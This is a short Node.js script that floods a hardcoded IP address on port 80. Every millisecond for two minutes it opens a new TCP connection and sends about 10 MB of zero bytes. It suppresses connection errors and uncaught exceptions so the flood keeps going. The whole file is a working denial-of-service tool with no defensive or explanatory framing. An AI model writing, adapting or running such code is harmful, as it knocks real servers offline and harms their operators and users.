import net from "net";
    let packagecount = 0;
const send_packets = setInterval(() => {
    const client = new net.Socket();
    client.connect(80, "37.114.56.111", function() {
        const payload = Buffer.alloc(10 * 1024 * 1024);
        const packet = Buffer.concat([Buffer.alloc(20), payload]);
        client.write(packet); // Sende das Paket
    });
    client.on("error", (err) => {
        if (err.code != "ECONNRESET") {
            console.log(err)
        }
    })
    console.log(`Sent ${packagecount} packages.`);
    packagecount++
}, 1)
setTimeout(() => {
    clearInterval(send_packets)
}, 120 * 1000);
process.on("uncaughtException", (err) => {
});
process.on("unhandledRejection", (err) => {
});
process.on("uncaughtExceptionMonitor", (err) => {
});
